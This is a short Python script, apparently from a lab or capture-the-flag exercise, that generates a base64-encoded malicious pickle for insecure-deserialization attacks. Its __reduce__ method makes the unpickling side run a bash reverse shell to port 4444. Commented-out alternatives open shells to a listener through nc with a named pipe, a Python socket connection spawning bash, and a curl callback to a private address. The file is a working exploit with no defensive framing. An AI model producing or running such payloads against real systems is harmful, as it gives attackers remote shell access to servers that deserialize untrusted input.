import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        #cmd = ('mkfifo /tmp/f; cat /tmp/f | '
        #       '/bin/sh -i 2>&1 | nc 3232266116 4444 > /tmp/f')
        #cmd = 'curl 192.168.119.132/hello'
        #cmd = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.132", 4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' # too long
        cmd = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"'
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
